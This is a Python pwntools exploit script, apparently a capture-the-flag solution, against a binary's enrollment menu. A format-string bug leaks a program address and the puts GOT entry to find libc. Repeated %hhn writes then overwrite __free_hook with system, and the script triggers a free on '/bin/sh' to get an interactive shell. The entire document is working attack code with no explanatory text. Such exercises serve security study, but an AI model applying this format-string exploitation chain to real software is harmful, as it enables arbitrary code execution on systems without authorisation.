from pwn import * 
binary = "./program_patched"

p = process(binary)
#p = remote("chal.firebird.sh", 35042)
elf = ELF(binary)
libc = ELF('./libc.so.6')
s = '''
b* enrollment_simulator+218
'''
gdb.attach(p, s)

# First interaction - input email and reason
p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"%27$p")


# Second interaction - view the info
p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"0x")


main_addr = b'0x' + p.recvuntil(b"W", drop = True) #b'0x561d57871532'
main_addr = int(main_addr.decode(), 16) #decode and convert to int with base 16 
#print(hex(main_addr))


elf.address = main_addr - 0x1532

puts_entry = elf.got['puts']

#print(hex(puts_entry))
p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(puts_entry)) # put GOT entry address to a stack variable 
p.sendlineafter(b"late enrollment:", b"%8$sAAAA") # dereferences to GOT entry address 

p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")
GOT_leak = int.from_bytes(p.recvuntil(b"A", drop = True), 'little')

libc.address = GOT_leak - libc.sym['puts']

#print(hex(GOT_leak))
#print(hex(libc.address))

# 0x7f1ca5c6de48, 0x7fbfea69ae48
# 0x7f1ca5ad1290, 0x7fbfea4fe290
free_hook_addr = libc.sym['__free_hook']
sys_addr = libc.sym['system']
print(hex(free_hook_addr))
print(hex(sys_addr))
#payload = fmtstr_payload(8, {libc.sym['__free_hook'] : libc.sym['system']})



format_specifiers = b'%144c%8$hhn'

address_payload = free_hook_addr

p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")





bytes = (sys_addr >> 8) & 0xff
format_specifiers = f'%{bytes}c%8$hhn'.encode()
#print(bytes)
address_payload = free_hook_addr + 1


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")





bytes = (sys_addr >> 16) & 0xff
format_specifiers = f'%{bytes}c%8$hhn'.encode()
#print(bytes)
address_payload = free_hook_addr + 2


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")




bytes = (sys_addr >> 24) & 0xff
format_specifiers = f'%{bytes}c%8$hhn'.encode()
#print(bytes)
address_payload = free_hook_addr + 3


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")




bytes = (sys_addr >> 32) & 0xff
#print(bytes)
format_specifiers = f'%{bytes}c%8$hhn'.encode()

address_payload = free_hook_addr + 4


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")




bytes = (sys_addr >> 40) & 0xff
#print(bytes)
format_specifiers = f'%{bytes}c%8$hhn'.encode()

address_payload = free_hook_addr + 5


p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", p64(address_payload))
p.sendlineafter(b"late enrollment:", format_specifiers) # now buffer also at %7$p


p.sendlineafter(b"6. Quit", b'4')
p.recvuntil(b"Reason for late enrollment:\n")






p.sendlineafter(b"6. Quit", b'1')
p.sendlineafter(b"ITSC email:", b'dummy')
p.sendlineafter(b"late enrollment:", b"/bin/sh")

p.sendlineafter(b"6. Quit", b'5')




p.interactive()